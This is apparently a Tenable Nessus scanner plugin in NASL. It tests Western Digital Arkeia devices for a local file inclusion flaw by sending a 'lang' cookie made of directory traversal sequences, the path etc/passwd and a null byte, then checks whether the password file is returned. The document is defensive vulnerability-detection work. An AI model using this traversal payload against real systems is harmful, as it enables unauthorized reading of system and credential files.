#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(74220);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_bugtraq_id(62444);
  script_osvdb_id(97614, 97615);
  script_xref(name:"EDB-ID", value:"28330");

  script_name(english:"Western Digital Arkeia lang Cookie Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a local
file inclusion vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Western Digital Arkeia device hosts a PHP script that is
affected by a local file inclusion vulnerability. A remote,
unauthenticated attacker can exploit this issue to read or execute
arbitrary files by crafting a request with directory traversal
sequences in the 'lang' cookie.

Note that the application is also reportedly affected by a remote file
upload arbitrary code execution vulnerability; however, Nessus has not
tested for this issue.");
  # ftp://ftp.arkeia.com/arkeia-software-application/arkeia-10.1/documentation/CHANGES-10.1.9
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?236dbbe5");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 10.1.9 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Western Digital Arkeia Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/09/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/08/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/05/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wdc:arkeia_virtual_appliance");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("wd_arkeia_detect.nbin");
  script_require_keys("www/PHP", "www/wd_arkeia");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE, embedded:TRUE);

install = get_install_from_kb(
  appname      : "wd_arkeia",
  port         : port,
  exit_on_fail : TRUE
);
dir = install["dir"];

app = "Western Digital Arkeia";
file = "etc/passwd";
file_pat = "root:.*:0:[01]:";

vuln = FALSE;
clear_cookiejar();
attack =  mult_str(str:"../", nb:12);
cookie = "lang="+attack+file+"%00";

user = rand_str();
pass = rand_str();

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + "/",
  add_headers  : make_array("Cookie", cookie),
  exit_on_fail : TRUE
);
if (egrep(pattern:file_pat, string:res[2])) vuln = TRUE;

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir, port:port));

# Filter output to remove page errors for 8.x / 9.x versions
output = res[2];
pos = stridx(output, '<br');
if (pos > 0)
{
  output = substr(output, 0, pos - 1);
}

if (report_verbosity > 0)
{
  snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
  report =
    '\n' + 'Nessus was able to exploit the issue to retrieve the contents of ' +
    '\n' + "'/" + file + "'" + ' using the following request :' +
    '\n' +
    '\n' + http_last_sent_request() +
    '\n';

  if (report_verbosity > 1)
  {
    if (
      !defined_func("nasl_level") ||
      nasl_level() < 5200 ||
      !isnull(get_preference("sc_version"))
    )
    {
      report +=
        '\n' + 'This produced the following truncated output :' +
        '\n' + snip +
        '\n' + beginning_of_response(resp:output, max_lines:'10') +
        '\n' + snip +
        '\n';
      security_warning(port:port, extra:report);
    }
    else
    {
      # Sanitize file names
      if ("/" >< file) file = ereg_replace(
        pattern:"^.+/([^/]+)$", replace:"\1", string:file);
      report +=
        '\n' + 'Attached is a copy of the response' + '\n';
      attachments = make_list();
      attachments[0] = make_array();
      attachments[0]["type"] = "text/plain";
      attachments[0]["name"] = file;
      attachments[0]["value"] = output;
      security_report_with_attachments(
        port  : port,
        level : 2,
        extra : report,
        attachments : attachments
      );
    }
  }
  else security_warning(port:port, extra:report);
}
else security_warning(port);
